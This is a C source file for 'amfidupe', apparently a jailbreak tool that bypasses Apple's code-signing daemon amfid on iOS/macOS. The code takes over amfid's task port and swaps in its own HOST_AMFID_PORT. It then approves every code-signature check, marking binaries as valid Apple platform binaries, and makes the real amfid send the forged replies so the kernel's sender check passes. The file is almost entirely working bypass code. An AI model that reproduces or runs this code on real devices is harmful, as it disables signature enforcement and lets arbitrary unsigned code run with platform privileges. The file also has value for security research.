/*
 * amfidupe
 * Brandon Azad
 *
 *
 * amfidupe: Dupe AMFI, dup amfid
 * ================================================================================================
 *
 *  Everyone seems to want to bypass amfid by patching its MISValidateSignatureAndCopyInfo()
 *  function. I think there's a better, more flexible way.
 *
 *  Amfidupe bypasses amfid by registering a new HOST_AMFID_PORT special port. This strategy hasn't
 *  worked in the past because AMFI checks that the reply messages sent to the amfid port came from
 *  the real amfid daemon. However, there's nothing stopping us from receiving the messages in our
 *  own process and then making the original amfid process send the reply: the kernel doesn't know
 *  that amfid isn't the original receiver of the message. This allows us to bypass amfid without
 *  performing any data patches at all.
 *
 *  An additional benefit of this approach is that we get direct access to the parameters to
 *  verify_code_directory(), which allows us to set flags that would otherwise be unavailable when
 *  using the traditional patch. For example, the is_apple parameter allows us to control whether
 *  the binary gets marked with the CS_PLATFORM_BINARY flag, which bestows platform binary
 *  privileges on it.
 *
 */

#include <assert.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#include "threadexec/threadexec.h"

#include "blanket/log/log.h"

#include "amfidupe/cdhash.h"
#include "amfidupe/process.h"
#include "amfidServer.h"

// The path to the amfid daemon.
const char *AMFID_PATH = "/usr/libexec/amfid";

// The threadexec context for amfid.
threadexec_t amfid_tx;

// The host port.
mach_port_t host;

// The amfid service port.
mach_port_t amfid_port;

// The fake port that we use to replace the real amfid port. The kernel will send requests intended
// for amfid here.
mach_port_t fake_amfid_port;

// Create an execution context in amfid.
static bool
create_amfid_threadexec() {
	// Get amfid's PID.
	pid_t amfid_pid;
	size_t count = 1;
	bool ok = proc_list_pids_with_path(AMFID_PATH, &amfid_pid, &count);
	if (!ok || count == 0) {
		ERROR("Could not find amfid process");
		return false;
	} else if (count > 1) {
		ERROR("Multiple processes with path %s", AMFID_PATH);
		return false;
	}
	DEBUG_TRACE(1, "Amfid PID: %d", amfid_pid);
	// Get amfid's task port.
	mach_port_t amfid_task;
	kern_return_t kr = task_for_pid(mach_task_self(), amfid_pid, &amfid_task);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not get amfid task");
		return false;
	}
	// Create the threadexec. The threadexec takes ownership of amfid's task port.
	amfid_tx = threadexec_init(amfid_task, MACH_PORT_NULL, 0);
	if (amfid_tx == NULL) {
		ERROR("Could not create execution context in amfid");
		return false;
	}
	return true;;
}

// Replace the host's amfid port with our own port so that we can impersonate amfid.
static bool
replace_amfid_port() {
	// Get a send right to the original amfid service port.
	host = mach_host_self();
	kern_return_t kr = host_get_amfid_port(host, &amfid_port);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not get amfid's service port");
		return false;
	}
	// Create a Mach port that will replace the amfid port.
	mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
	kr = mach_port_construct(mach_task_self(), &options, 0, &fake_amfid_port);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not create fake amfid port");
		return false;
	}
	// Set our new Mach port as the host special port. From this point on, all kernel
	// requests intended for amfid will be sent to us.
	kr = host_set_amfid_port(host, fake_amfid_port);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not register fake amfid port: error %d", kr);
		return false;
	}
	DEBUG_TRACE(1, "Registered new amfid port: 0x%x", fake_amfid_port);
	return true;
}

// Close our fake amfid port and restore the original one.
static void
restore_amfid_port() {
	// Restore the original amfid port.
	kern_return_t kr = host_set_amfid_port(host, amfid_port);
	if (kr != KERN_SUCCESS) {
		WARNING("Could not restore fake amfid port");
	}
	// Close our fake amfid port.
	mach_port_destroy(mach_task_self(), fake_amfid_port);
	fake_amfid_port = MACH_PORT_NULL;
}

// Compute the cdhash of the specified file.
static bool
compute_cdhash_of_file(const char *path, uint64_t file_offset, uint8_t *cdhash) {
	bool success = false;
	// Open the file.
	int fd = open(path, O_RDONLY);
	if (fd < 0) {
		ERROR("Could not open %s", path);
		goto fail_0;
	}
	// Get the size of the file.
	struct stat st;
	int err = fstat(fd, &st);
	if (err != 0) {
		ERROR("Could not get size of file %s", path);
		goto fail_1;
	}
	size_t size = st.st_size;
	if (file_offset >= size) {
		ERROR("Invalid file offset");
		goto fail_1;
	}
	size -= file_offset;
	// Map the file into memory.
	void *file = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, file_offset);
	if (file == MAP_FAILED) {
		goto fail_1;
	}
	// Compute the cdhash.
	success = compute_cdhash(file, size, cdhash);
	if (!success) {
		ERROR("Could not compute cdhash of %s", path);
	}
fail_2:
	munmap(file, file_offset);
fail_1:
	close(fd);
fail_0:
	return success;
}

// Our replacement for amfid's verify_code_directory().
kern_return_t
verify_code_directory(
		mach_port_t amfid_port,
		amfid_path_t path,
		uint64_t file_offset,
		int32_t a4,
		int32_t a5,
		int32_t a6,
		int32_t *entitlements_valid,
		int32_t *signature_valid,
		int32_t *unrestrict,
		int32_t *signer_type,
		int32_t *is_apple,
		int32_t *is_developer_code,
		amfid_a13_t a13,
		amfid_cdhash_t cdhash,
		audit_token_t audit) {
	DEBUG_TRACE(1, "%s(%s, %llu, %u, %u, %u)", __func__, path, file_offset, a4, a5, a6);
	// Check that the message came from the kernel.
	audit_token_t kernel_token = KERNEL_AUDIT_TOKEN_VALUE;
	if (memcmp(&audit, &kernel_token, sizeof(audit)) != 0) {
		ERROR("%s: Invalid sender %d", __func__, audit.val[5]);
		return KERN_FAILURE;
	}
	// Compute the cdhash.
	bool ok = compute_cdhash_of_file(path, file_offset, cdhash);
	if (!ok) {
		return KERN_FAILURE;
	}
	// Grant all the permissions.
	*entitlements_valid = 1;
	*signature_valid = 1;
	*unrestrict = 1;
	*signer_type = 0;
	*is_apple = 1;
	*is_developer_code = 0;
	return KERN_SUCCESS;
}

// Our replacement for amfid's permit_unrestricted_debugging().
kern_return_t
permit_unrestricted_debugging(
		mach_port_t amfid_port,
		int32_t *unrestricted_debugging,
		audit_token_t audit) {
	DEBUG_TRACE(1, "%s()", __func__);
	return KERN_FAILURE;
}

// Run our fake amfid server. We need to do something slightly tricky: receive the messages on
// fake_amfid_port in this task but send the reply to the messages from within amfid. That way, we
// can bypass the kernel's check that the message came from amfid in the function tokenIsTrusted().
//
// Note: The only place where amfidupe relies on threadexec nontrivially is in making amfid call
// mach_msg(). However, since mach_msg() takes just 7 arguments, it should be pretty
// straightforward to use thread_set_state() directly.
static void
run_amfid_server() {
	// Build a local buffer for the request.
	uint8_t request_data[sizeof(union __RequestUnion__amfid_subsystem) + MAX_TRAILER_SIZE];
	mach_msg_header_t *request = (mach_msg_header_t *)request_data;
	// Get memory from the threadexec for our reply buffer.
	const uint8_t *reply_R;
	mig_reply_error_t *reply;
	threadexec_shared_vm_default(amfid_tx, (const void **)&reply_R, (void **)&reply, NULL);
	for (;;) {
		// Receive a message from the kernel.
		mach_msg_option_t options = MACH_RCV_MSG
			| MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0)
			| MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);
		kern_return_t kr = mach_msg(request, options, 0, sizeof(request_data),
				fake_amfid_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
		if (kr != KERN_SUCCESS) {
			DEBUG_TRACE(1, "Failed to receive message on fake amfid port: %d", kr);
			break;
		}
		// Process the message with our amfid server to fill in the reply.
		amfid_server(request, &reply->Head);
		// Mig semantics.
		if (!MACH_MSGH_BITS_IS_COMPLEX(reply->Head.msgh_bits)) {
			if (reply->RetCode == MIG_NO_REPLY) {
				reply->Head.msgh_remote_port = MACH_PORT_NULL;
			} else if (reply->RetCode != KERN_SUCCESS) {
				request->msgh_remote_port = MACH_PORT_NULL;
				mach_msg_destroy(request);
			}
		}
		// Now translate that reply so it can be sent by amfid back to the kernel.
		// Fortunately none of amfid's reply messages are complex, which means we only need
		// to translate the reply port.
		assert(!MACH_MSGH_BITS_IS_COMPLEX(reply->Head.msgh_bits));
		assert(MACH_MSGH_BITS_REMOTE(reply->Head.msgh_bits) == MACH_MSG_TYPE_MOVE_SEND_ONCE);
		bool ok = threadexec_mach_port_insert(amfid_tx, reply->Head.msgh_remote_port,
				&reply->Head.msgh_remote_port, MACH_MSG_TYPE_MOVE_SEND_ONCE);
		if (!ok) {
			ERROR("Could not move the send-once right into amfid");
			mach_port_deallocate(mach_task_self(), reply->Head.msgh_remote_port);
			goto check_amfid;
		}
		// Finally, make amfid send the reply to the kernel.
		ok = threadexec_call_cv(amfid_tx, &kr, sizeof(kr),
				mach_msg, 7,
				TX_CARG_LITERAL(mach_msg_header_t *, reply_R),
				TX_CARG_LITERAL(mach_msg_option_t, MACH_SEND_MSG),
				TX_CARG_LITERAL(mach_msg_size_t, reply->Head.msgh_size),
				TX_CARG_LITERAL(mach_msg_size_t, 0),
				TX_CARG_LITERAL(mach_port_t, MACH_PORT_NULL),
				TX_CARG_LITERAL(mach_msg_timeout_t, MACH_MSG_TIMEOUT_NONE),
				TX_CARG_LITERAL(mach_port_t, MACH_PORT_NULL));
		if (!ok) {
			ERROR("Could not send our reply from amfid: error %d", kr);
			threadexec_mach_port_deallocate(amfid_tx, reply->Head.msgh_remote_port);
			goto check_amfid;
		}
		// Everything's good :)
		continue;
		// If we encountered an error, check that amfid is still alive.
check_amfid:;
		int amfid_pid;
		kr = pid_for_task(threadexec_task(amfid_tx), &amfid_pid);
		if (kr != KERN_SUCCESS) {
			ERROR("Amfid died");
			break;
		}
	}
}

// The signal handler for all signals.
static void
signal_handler(int signum) {
	// Restoring the amfid port will also destroy our fake port, which should break us out of
	// the server loop.
	restore_amfid_port();
}

// Register our signal handler.
static void
install_signal_handler() {
	const int signals[] = {
		SIGHUP, SIGINT, SIGQUIT, SIGILL, SIGTRAP, SIGABRT, SIGEMT, SIGFPE, SIGBUS,
		SIGSEGV, SIGSYS, SIGPIPE, SIGALRM, SIGTERM, SIGXCPU, SIGXFSZ, SIGVTALRM, SIGPROF,
		SIGUSR1, SIGUSR2,
	};
	struct sigaction act = { .sa_handler = signal_handler };
	for (size_t i = 0; i < sizeof(signals) / sizeof(signals[0]); i++) {
		int err = sigaction(signals[i], &act, NULL);
		if (err != 0) {
			WARNING("Failed to register for signal %d", signals[i]);
		}
	}
}

int
main(int argc, const char *argv[]) {
	int ret = 1;
	INFO("amfidupe: pid=%d, uid=%d", getpid(), getuid());
	// Set up our signal handlers.
	install_signal_handler();
	// Create an execution context in amfid.
	bool ok = create_amfid_threadexec();
	if (!ok) {
		goto fail_0;
	}
	// Replace the kernel's amfid port with our own port.
	ok = replace_amfid_port();
	if (!ok) {
		goto fail_1;
	}
	// Run our custom amfid server. This function will run until we're told to quit.
	run_amfid_server();
	ret = 0;
	// Restore the original amfid port.
	restore_amfid_port();
fail_1:
	// Close the threadexec context in amfid.
	threadexec_deinit(amfid_tx);
fail_0:
	// Done!
	INFO("amfidupe: exit");
	return ret;
}
